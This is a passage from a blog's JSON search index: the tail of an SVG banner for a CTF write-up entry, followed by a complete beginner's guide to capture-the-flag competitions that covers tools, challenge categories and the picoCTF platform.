style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'\u003ex\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='52' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='4' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='152' y='4' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'\u003e+\u003c/text\u003e\n\u003ctext text-anchor='middle' x='160' y='4' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='168' y='4' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'\u003eN\u003c/text\u003e\n\u003ctext text-anchor='middle' x='176' y='4' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='184' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='192' y='4' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003ctext text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'\u003eH\u003c/text\u003e\n\u003ctext text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'\u003ek\u003c/text\u003e\n\u003ctext text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003c/g\u003e\n\n    \u003c/svg\u003e\n  \n\u003c/div\u003e\n\u003cp\u003eWelcome to the file sharing portal! We only support tar files!\u003c/p\u003e","title":"n00bzCTF - File Sharing Portal"},{"content":"When I first encountered cybersecurity, it was through phishing sites that people used to steal their friends\u0026rsquo; Facebook accounts. One of my friends even used one against another one of our friends to send messages from his account. No, that\u0026rsquo;s not some ghost story, lol.\nAfter that, I started taking cybersecurity more seriously. Coming from an academic background, I thought the best approach was to learn all the concepts first and then practice my skills. However, this linear approach has major flaws:\nYou will forget most of what you learned by the time you start practicing. The brain is a muscle that needs exercise to grow. In my experience, what you learn and what you practice are related but require different mindsets. My main challenge was finding an enjoyable and effective way to learn and practice cybersecurity concepts. That\u0026rsquo;s when I discovered Capture the Flag (CTF) competitions.\nFrom Wikipedia:\n\u0026ldquo;Capture the Flag (CTF) in computer security is an exercise in which participants attempt to find text strings, called \u0026lsquo;flags,\u0026rsquo; which are secretly hidden in purposefully-vulnerable programs or websites. They can be used for both competitive or educational purposes.\u0026rdquo;\nBefore I dive into how to start playing CTFs and optimizing them for your learning, let me assure you that this practical approach to learning cybersecurity doesn\u0026rsquo;t prevent you from studying more formally. In fact, you can do both.\nWith that out of the way, here are X steps to start playing CTFs:\nThe Tools You Need Linux: Almost essential. Download any distro (e.g., Ubuntu or Kali), and get comfortable navigating the system using the command line. Learn to use apt, pacman, or whatever package manager your distro comes with. If you\u0026rsquo;re coming from a Windows background, you\u0026rsquo;ll find that installing packages is much easier in Linux once you know how.\nScripting Language: Learn a scripting language, such as Python. It\u0026rsquo;s not the only option, but it\u0026rsquo;s widely used. You\u0026rsquo;ll find yourself using it to solve problems and automate tedious tasks.\nWhat Kind of CTFs Should You Play? CTF challenges come in various flavors. I\u0026rsquo;ll focus on Jeopardy-style CTFs, where participants capture flags by solving challenges across multiple categories. Here\u0026rsquo;s a list of common categories:\nCrypto: Challenges involving cryptography, including encryption, decryption, and cryptanalysis. Reverse Engineering: Analyzing binaries to understand or modify their behavior. Pwn/Exploitation: Exploiting vulnerabilities in programs to gain control or execute arbitrary code. Web: Challenges focused on web application vulnerabilities like SQL injection, XSS, and CSRF. Forensics: Analyzing data, logs, or files to uncover hidden information or traces of attacks. Steganography: The art of hiding messages or data within images, audio, or other media. Miscellaneous: Unique or unconventional challenges that don‚Äôt fit into other categories. OSINT: Gathering and analyzing publicly available information. Binary Exploitation: Exploiting memory corruption or other vulnerabilities in binary files. Programming: Writing scripts or code to solve problems or automate tasks. Resources and Tips for Learning Now that you have Arch Linux rocking with Vim, Tmux, and maybe even i3 as your window manager (just kidding!), you\u0026rsquo;re ready to start playing.\nYou might ask, \u0026ldquo;I have the tools, sure, but I know NOTHING about cybersecurity. How can I practice something I don\u0026rsquo;t even understand?\u0026rdquo;\nThat\u0026rsquo;s the beauty of Capture the Flag competitions‚Äîthey\u0026rsquo;re designed to teach you concepts and stretch your knowledge. My advice for every challenge is to read the description, Google any unfamiliar terms, and use the hints provided. If you ever get stuck, writeups (solutions) are publicly available and can teach you how to solve the challenge, so you can learn from them.\nOh, and by the way, I share those writeups too, so check out my blog!\nWith that in mind, I recommend starting with picoCTF. It covers challenges across six domains of cybersecurity, including general skills, cryptography, web exploitation, forensics, and more. The challenges are specifically designed to be hacked, making it an excellent and legal way to gain hands-on experience.\nIn conclusion, remember that cybersecurity is a community. You can always ask for help, and help will surely be provided. If you\u0026rsquo;d like to join my Discord server to connect with me and other cybersecurity enthusiasts, check the link on the main page. Take care!\n","permalink":"https://hxuu.github.io/blog/ctf/ctfs-a-beginner-guide/","summary":"\u003cp\u003eWhen I first encountered cybersecurity, it was through phishing sites that people used to steal their friends\u0026rsquo; Facebook accounts. One of my friends even used one against another one of our friends to send messages from his account. No, that\u0026rsquo;s not some ghost story, lol.\u003c/p\u003e\n\u003cp\u003eAfter that, I started taking cybersecurity more seriously. Coming from an academic background, I thought the best approach was to learn all the concepts first and then practice my skills. However, this linear approach has major flaws:\u003c/p\u003e","title":"Ctfs - A Beginner's Guide"}]